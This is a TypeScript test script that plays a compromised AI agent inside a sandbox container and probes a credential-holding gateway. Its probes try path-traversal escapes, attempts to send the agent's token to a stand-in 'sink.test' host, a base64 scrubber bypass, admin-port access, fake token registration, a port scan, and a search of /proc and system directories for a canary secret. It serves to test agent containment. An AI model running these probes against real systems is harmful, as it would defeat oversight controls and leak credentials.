// Runs inside a Kurumi turn container as the compromised agent: bun attack-wire.ts <gateway-host>.
// Same probes against every base-URL gateway. One JSON line per probe on stdout.
import { connect } from 'node:net'
import { readFileSync, readdirSync, statSync } from 'node:fs'
import { join } from 'node:path'

const gw = process.argv[2] ?? 'kh1-ag'
const tok = process.env['CLAUDE_CODE_OAUTH_TOKEN'] ?? ''
const tag = process.argv[3] ?? ''
const CANARY = 'CANARY_REAL'

const raw = (host: string, port: number, req: string, ms = 4000) =>
  new Promise<string>((resolve) => {
    let got = ''
    const s = connect(port, host, () => s.write(req.replaceAll('probe=', `probe=${tag}`).replaceAll('probe%3D', `probe%3D${tag}`)))
    s.setTimeout(ms, () => (s.destroy(), resolve(got || '(timeout)')))
    s.on('data', (d) => (got += d.toString('latin1')))
    s.on('end', () => resolve(got || '(closed, no response)'))
    s.on('error', (e) => resolve(`error: ${e.message}`))
  })

const bodyOf = (res: string) => {
  const [head = "", ...rest] = res.split("\r\n\r\n")
  let body = rest.join("\r\n\r\n")
  if (/transfer-encoding: chunked/i.test(head)) {
    let out = ""
    for (let i = 0; i < body.length; ) {
      const nl = body.indexOf("\r\n", i)
      const n = parseInt(body.slice(i, nl), 16)
      if (!(n > 0)) break
      out += body.slice(nl + 2, nl + 2 + n)
      i = nl + 2 + n + 2
    }
    body = out
  }
  return body
}
const report = (id: string, what: string, res: string, extra: Record<string, unknown> = {}) =>
  console.log(JSON.stringify({ id, what, status: res.split("\r\n")[0], body: bodyOf(res).slice(0, 240), canaryInResponse: res.includes(CANARY), ...extra }))

const req = (method: string, target: string, opts: { auth?: string | null; host?: string; body?: string; headers?: string[] } = {}) => {
  const auth = opts.auth === undefined ? `Bearer ${tok}` : opts.auth
  const lines = [`${method} ${target} HTTP/1.1`, `Host: ${opts.host ?? `${gw}:8081`}`, ...(auth ? [`Authorization: ${auth}`] : []), ...(opts.headers ?? []), 'Connection: close']
  if (opts.body !== undefined) lines.push('Content-Type: application/json', `Content-Length: ${Buffer.byteLength(opts.body)}`)
  return `${lines.join('\r\n')}\r\n\r\n${opts.body ?? ''}`
}

const probes: [string, string, number, string][] = [
  ['P1', 'allowed GET /repos/a/b/issues with the turn token', 8081, req('GET', '/repos/a/b/issues?probe=P1')],
  ['P2', 'model route POST /v1/messages', 8080, req('POST', '/v1/messages?probe=P2', { host: `${gw}:8080`, body: '{"model":"m","max_tokens":1,"messages":[{"role":"user","content":"P2"}]}', headers: ['anthropic-version: 2023-06-01'] })],
  ['T1', 'no token', 8081, req('GET', '/repos/a/b/issues?probe=T1', { auth: null })],
  ['T2', 'unregistered token with the kurumi-fake- prefix', 8081, req('GET', '/repos/a/b/issues?probe=T2', { auth: 'Bearer kurumi-fake-never-registered' })],
  ['E14', 'no token on a listener whose apiKey mode is omitted (agentgateway :8082)', 8082, req('GET', '/repos/a/b/issues?probe=E14', { auth: null, host: `${gw}:8082` })],
  ['D1', 'disallowed method DELETE on an allowed path', 8081, req('DELETE', '/repos/a/b/issues?probe=D1')],
  ['D2', 'disallowed path GET /user', 8081, req('GET', '/user?probe=D2')],
  ['D3', 'U8: broker-gated POST /repos/a/b/issues through the wire', 8081, req('POST', '/repos/a/b/issues?probe=D3', { body: '{"title":"D3 wire-path issue","body":"created through the wire gateway"}' })],
  ['D4', 'U8: broker-gated GraphQL mutation through the wire', 8081, req('POST', '/graphql?probe=D4', { body: '{"query":"mutation { createIssue(input:{title:\\"D4\\"}) { id } }","variables":{"probe":"D4"}}' })],
  ['D5', 'U8: broker-gated POST /gists through the wire', 8081, req('POST', '/gists?probe=D5', { body: '{"files":{"x.txt":{"content":"D5"}}}' })],
  ['D6', 'dot-segment escape GET /repos/a/b/../../../user', 8081, req('GET', '/repos/a/b/../../../user?probe=D6')],
  ['D7', 'encoded dot-segment GET /repos/a/b/%2e%2e/%2e%2e/%2e%2e/user', 8081, req('GET', '/repos/a/b/%2e%2e/%2e%2e/%2e%2e/user?probe=D7')],
  ['D8', 'encoded slash GET /repos/a/b/..%2f..%2f..%2fuser', 8081, req('GET', '/repos/a/b/..%2f..%2f..%2fuser?probe=D8')],
  ['D9', 'HEAD on an allowed path (only GET allowed)', 8081, req('HEAD', '/repos/a/b/issues?probe=D9')],
  ['O1', 'absolute-URI to the sink', 8081, req('GET', 'http://sink.test/O1?probe=O1', { host: 'sink.test' })],
  ['O2', 'Host header names the sink', 8081, req('GET', '/repos/a/b/issues?probe=O2', { host: 'sink.test' })],
  ['O3', 'CONNECT to the sink', 8081, `CONNECT sink.test:80 HTTP/1.1\r\nHost: sink.test:80\r\nAuthorization: Bearer ${tok}\r\n\r\nGET /O3?probe=O3 HTTP/1.1\r\nHost: sink.test\r\n\r\n`],
  ['O4', 'scheme-relative target //sink.test/O4', 8081, req('GET', '//sink.test/O4?probe=O4')],
  ['O5', 'h2c prior knowledge', 8081, 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'],
  ['L1', 'echo endpoint on the allowed host reflects request headers', 8081, req('GET', '/echo?probe=L1')],
  ['L2', 'echo base64-encoded (scrubber bypass)', 8081, req('GET', '/echo?enc=b64&probe=L2')],
  ['L3', 'redirect to the sink: does the gateway follow it with the credential?', 8081, req('GET', `/redirect?to=${encodeURIComponent('http://sink.test/L3?probe=L3')}&probe=L3`)],
  ['L4', 'redirect to the echo on the same host', 8081, req('GET', `/redirect?to=${encodeURIComponent('https://api.github.test/echo?probe=L4-followed')}&probe=L4`)],
  ['C2', 'admin :15000 /config_dump', 15000, req('GET', '/config_dump', { host: `${gw}:15000` })],
  ['C3', 'stats :15020 /metrics', 15020, req('GET', '/metrics', { host: `${gw}:15020` })],
  ['C4', 'readiness :15021 /healthz/ready', 15021, req('GET', '/healthz/ready', { host: `${gw}:15021` })],
  ['C5', 'minimal gateway admin :9901 /register (no secret)', 9901, req('POST', '/register', { host: `${gw}:9901`, auth: null, body: '{"token":"kurumi-fake-attacker","turn":"x"}' })],
]

for (const [id, what, port, r] of probes) {
  const res = await raw(gw, port, r)
  if (id === 'L2') {
    const b64 = bodyOf(res).trim()
    const decoded = (() => { try { return Buffer.from(b64, 'base64').toString() } catch { return '' } })()
    report(id, what, res, { canaryAfterBase64Decode: decoded.includes(CANARY) })
  } else report(id, what, res)
}

// C1: TCP reachability of the gateway's ports from the container.
const open: Record<number, string> = {}
for (const port of [22, 80, 443, 8080, 8081, 8082, 9090, 9091, 9901, 15000, 15001, 15020, 15021, 18080, 18081]) {
  open[port] = await new Promise<string>((resolve) => {
    const s = connect(port, gw, () => (s.destroy(), resolve('open')))
    s.setTimeout(1500, () => (s.destroy(), resolve('timeout')))
    s.on('error', (e) => resolve((e as NodeJS.ErrnoException).code ?? 'error'))
  })
}
console.log(JSON.stringify({ id: 'C1', what: `TCP scan of ${gw}`, ports: open }))
const ext = await raw('10.251.10.30', 9901, req('POST', '/register', { host: '10.251.10.30:9901', auth: null, body: '{}' }), 2000)
report('C6', 'minimal gateway admin on its control-network address 10.251.10.30:9901', ext)

// G1: canary grep over what the container can read.
const hits: string[] = []
const scan = (p: string, depth = 0) => {
  try {
    const st = statSync(p)
    if (st.isDirectory()) { if (depth < 6) for (const e of readdirSync(p)) scan(join(p, e), depth + 1) }
    else if (st.size < 5_000_000 && readFileSync(p, 'latin1').includes(CANARY)) hits.push(p)
  } catch {}
}
for (const pid of readdirSync('/proc').filter((d) => /^\d+$/.test(d))) for (const f of ['environ', 'cmdline']) scan(`/proc/${pid}/${f}`)
for (const d of ['/cfg', '/tmp', '/etc', '/root', '/home']) scan(d)
scan('/work')
console.log(JSON.stringify({ id: 'G1', what: 'canary grep over env, /proc/*/environ|cmdline, /cfg, /work, /tmp, /etc, /root, /home', hits: hits.filter((h) => !h.includes('/.attack/')), envHasCanary: JSON.stringify(process.env).includes(CANARY) }))
